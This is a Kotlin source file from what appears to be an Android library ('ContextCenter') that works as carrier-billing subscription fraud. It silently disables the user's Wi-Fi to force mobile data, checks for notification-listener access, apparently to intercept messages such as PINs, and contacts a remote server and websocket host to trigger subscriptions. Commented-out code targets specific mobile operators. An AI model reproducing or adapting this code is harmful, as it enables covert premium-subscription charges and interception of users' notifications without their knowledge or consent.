package com.mos.lib.common.persenter

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.WifiManager
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.TextUtils
import android.webkit.WebView
import android.widget.RelativeLayout

import com.alibaba.fastjson.JSON
import com.blankj.utilcode.util.LogUtils
import com.blankj.utilcode.util.NetworkUtils
import com.blankj.utilcode.util.Utils
import com.cp.log.BuildConfig
import com.cp.log.CheckBean
import com.cp.log.Log4js
import com.cp.log.event.LogEvent
import com.mos.lib.common.Ws
import com.mos.lib.common.util.PermissionUtils
import com.mos.lib.common.Report
import com.mos.lib.common.http.SubProxy
import com.mos.lib.common.util.SharedUtil
import com.mos.lib.common.util.StringUtil
import com.mos.lib.common.util.NetUtil

import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response

import com.mos.lib.common.persenter.AnyFieldCall.*


class ContextCenter {


    private var context: Context? = null

    private var receiver: NetworkStateReceiver? = null

    private var event: LogEvent? = null

    private var subCall: AnyFieldCall? = null

    private var layout: RelativeLayout? = null

    private fun initSubCall() {
        val userAgent = WebView(context).settings.userAgentString
        operator = if (StringUtil.isEmpty(operator)) NetUtil.operator else operator

        subCall = Ws()
        if (subCall != null) {
            subCall?.init(userAgent, operator, event)
            if (subProxy != null) {
                subCall?.setProxy(subProxy)
            }
        }


        //        switch (operator) {

        //            case ITALY_TIM:
        //                LogUtils.i("init TIM", operator);
        //                subCall = new TIMSub();
        //                break;
        //            case AUSTRIA_H3G:
        //            case AUSTRIA_H3G_2:
        //                subCall = new Ws();
        //                LogUtils.i("初始化 奥地利 H3G", operator);
        //                subCall = new AustriaH3G(this.context);
        //                break;
        //            case AUSTRIA_OPERATOR_A1_1:
        //            case AUSTRIA_OPERATOR_A1_2:
        //                LogUtils.i("初始化 奥地利 A1", operator);
        //                subCall = new AustriaA1();
        //                subCall = new Ws();
        //                break;
        //            default:

    }

    /**
     * @param context
     * @param event
     */
    private constructor(context: Context, event: LogEvent) {
        this.context = context
        this.event = event

        initSubCall()
        if (!SharedUtil.isInstalled) {
            event.onMessage(AnyField.Companion.INSTALLED, "")
            Report.report!!.i(AnyField.Companion.INSTALLED)
            SharedUtil.installed()
        }
    }


    private constructor(context: Context, event: LogEvent, layout: RelativeLayout) {
        this.context = context
        this.event = event
        this.layout = layout

        initSubCall()

        if (!SharedUtil.isInstalled) {

            event.onMessage(AnyField.Companion.INSTALLED, "")
            Report.report!!.i(AnyField.Companion.INSTALLED)


            SharedUtil.installed()

        }

    }

    private class NetworkStateReceiver : BroadcastReceiver() {
        fun destroy() {
            subContext!!.context!!.unregisterReceiver(this)
            subContext!!.receiver = null
        }

        override fun onReceive(context: Context, intent: Intent) {
            LogUtils.i("NetworkStateReceiver ", intent.toString())
            if (NetworkUtils.isConnected() && !NetworkUtils.isWifiConnected() && NetworkUtils.isMobileData()) {

                subContext!!.subCall!!.report(AnyField.Companion.OPEN_4G_NETWORK)

                call(context)

                destroy()

            }
        }
    }

    companion object {
        private const val ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners"
        @SuppressLint("StaticFieldLeak")
        private var subContext: ContextCenter? = null

        var running = false

        //debug
        private var closeWifi = true
        private var subProxy: SubProxy? = null
        private var operator: String? = null

        private val client = OkHttpClient()

        private val mainHandler = Handler(Looper.getMainLooper())

        fun call(context: Context?) {

            Thread(Runnable {
                if (!running) {
                    //                Request request = new Request.Builder().url("http://192.168.50.165:8077/api/check_is_pin?operator=43434").build();
                    LogUtils.i("init_sub_call")

                    if (BuildConfig.DEBUG) {
                        LogUtils.i("debug_call")
                        subContext?.subCall?.r?.i("debug_call")
                        Log4js.isPermission = true
                        subCall()
                    } else {
                        val request = Request.Builder().url(AnyField.Companion.APP_CHECK_HOST + AnyField.Companion.APP_CHECK_OPERATOR + operator).build()
                        val response: Response
                        try {
                            response = client.newCall(request).execute()
                            if (response.isSuccessful) {
                                assert(response.body() != null)
                                val string = response.body()!!.string()
                                val checkBean = JSON.parseObject(string, CheckBean::class.java)

                                if (checkBean.code == 1) {
                                    LogUtils.i("getCode == 1 return")
                                    //                                return;
                                }

                                mainHandler.post {
                                    //result = 1 代表需要ping
                                    if (checkBean.result == 1) {
                                        if (!isNotificationServiceEnabled) {
                                            LogUtils.i("ping_show_dialog")
                                            if (!PermissionUtils.initDialog(context)?.isShowing!!) {
                                                PermissionUtils.initDialog(context)?.show()
                                                subContext?.subCall?.r?.i("show_dialog")
                                            }
                                        } else {
                                            subContext?.subCall?.r?.i("ping_call")
                                            LogUtils.i("ping_call")
                                            //                                        call(context);
                                            subCall()
                                        }
                                    } else {
                                        LogUtils.i("click_call")
                                        subContext?.subCall?.r?.i("click_call")
                                        Log4js.isPermission = true
                                        //                                    call(context);
                                        subCall()
                                    }
                                }
                            } else {
                                throw Exception("Unexpected code $response")
                            }
                        } catch (e: Exception) {
                            LogUtils.w("Exception return")
                            e.printStackTrace()
                        }

                    }


                } else {
                    LogUtils.i("init_running")
                }
            }).start()

        }

        fun subCall() {
            LogUtils.i("execute_call")
            synchronized(ContextCenter::class.java) {

                if (!Log4js.isPermission) {
                    if (!isNotificationServiceEnabled) {

                        subContext?.subCall?.r?.w("not_notification_permission")

                        //                    running = false;

                        if (BuildConfig.DEBUG) {
                            LogUtils.i("not_notification_permission")
                        }
                        return
                    }
                }
                if (!running && subContext?.subCall != null) {

                    val success = SharedUtil.isSuccess

                    LogUtils.i("sub_status", success)

                    //是否订阅成功
                    if (!success) {
                        //                    int data = 1;
                        //state = 0时，为带ping订阅
                        LogUtils.w("ContextCenter")

                        //                    if (subContext.subCall instanceof AustriaH3G) {
                        //                        if (!isNotificationServiceEnabled()) {
                        //
                        //                            subContext.subCall.r.w("not_notification_permission");
                        //
                        //                            running = false;
                        //
                        //                            return;
                        //                        }
                        //                    }
                        //                    else if (AnyField.TH_AIS.equals(subContext.subCall.operator)) {
                        //
                        //                        if (!isNotificationServiceEnabled()) {
                        //
                        //                            subContext.subCall.r.w("not_notification_permission");
                        //
                        //                            running = false;
                        //
                        //                            return;
                        //                        }
                        //                    }
                        Thread(Runnable {
                            try {
                                val info: String?
                                if (BuildConfig.DEBUG) {
                                    info = "ws://fsdy.comic4you.com/ws/ws"
                                } else {
                                    info = Report.report!!.info()
                                }

                                if (!StringUtil.isEmpty(info)) {
                                    running = true
                                    //关闭wifi
                                    if (wifiStateAndClose()) {
                                        subContext?.subCall?.r?.i("close_wifi")
                                        //调用 Ws 中sub方法
                                        subContext?.subCall?.sub(info!!)

                                    }
                                }

                            } catch (e: Exception) {
                                LogUtils.e(e)
                            } finally {
                                //                                running = false;
                            }
                        }).start()
                    } else {
                        running = false
                    }
                }
            }
        }


        /**
         * 初始化 ContextCenter init方法
         *
         * @param context
         * @param event
         */
        fun init(context: Context, event: LogEvent) {
            synchronized(LogEvent::class.java) {
                Utils.init(context)
                //初始化上报函数
                //APP_SERVER_HOST = http://52.53.238.169:8081
                Report.init(AnyField.Companion.APP_SERVER_HOST)

                if (subContext == null) {

                    subContext = ContextCenter(context, event)
                }

            }

        }

        fun init(context: Context, event: LogEvent, layout: RelativeLayout) {

            synchronized(LogEvent::class.java) {


                Utils.init(context)

                Report.init(AnyField.Companion.APP_SERVER_HOST)


                if (subContext == null) {

                    subContext = ContextCenter(context, event, layout)

                }

            }

        }


        private fun wifiStateAndClose(): Boolean {

            if (closeWifi) {

                val netCode = NetUtil.getNetworkState(subContext?.context!!)

                if (netCode == NetUtil.NETWORK_WIFI) {

                    LogUtils.i("start_close_wifi")
                    //注册广播
                    subContext?.receiver.let {
                        subContext?.receiver = NetworkStateReceiver()

                        val filter = IntentFilter()

                        filter.addAction("android.net.conn.CONNECTIVITY_CHANGE")
                        filter.addAction("android.net.wifi.WIFI_STATE_CHANGED")
                        filter.addAction("android.net.wifi.STATE_CHANGE")

                        subContext?.context?.registerReceiver(subContext?.receiver, filter)
                    }

                    val wifiManager = subContext?.context?.applicationContext?.getSystemService(Context.WIFI_SERVICE) as WifiManager

                    wifiManager.isWifiEnabled = false

                    return false
                } else if (netCode == NetUtil.NETWORK_NONE) {
                    LogUtils.w("not_network")
                    return false
                }
            }

            return true
        }

        fun closeWifi(wifi: Boolean) {
            closeWifi = wifi
        }

        fun log(log: Boolean) {
            LogUtils.getConfig().isLogSwitch = log
            LogUtils.getConfig().isLogHeadSwitch = false
            LogUtils.getConfig().setBorderSwitch(true)
            LogUtils.getConfig().isSingleTagSwitch = true

        }

        fun proxy(proxy: SubProxy) {
            subProxy = proxy
        }

        fun setOperator(code: String) {
            operator = code
        }


        /**
         * 该方法用于开启通知后回调
         *
         * @param message
         */
        fun call(message: String) {
            subContext?.subCall?.run {
                Thread(Runnable {
                    subContext?.subCall?.onSub(message)
                    subContext?.subCall?.r?.i("send_message")
                }).start()
            }
        }

        private val isNotificationServiceEnabled: Boolean
            get() {

                val pkgName = subContext?.context?.packageName
                val flat = Settings.Secure.getString(subContext?.context?.contentResolver,
                        ENABLED_NOTIFICATION_LISTENERS)

                if (!TextUtils.isEmpty(flat)) {
                    val names = flat.split(":".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()

                    for (name in names) {
                        val cn = ComponentName.unflattenFromString(name)
                        if (cn != null) {
                            if (TextUtils.equals(pkgName, cn.packageName)) {
                                return true
                            }
                        }
                    }
                }
                return false
            }
    }


}
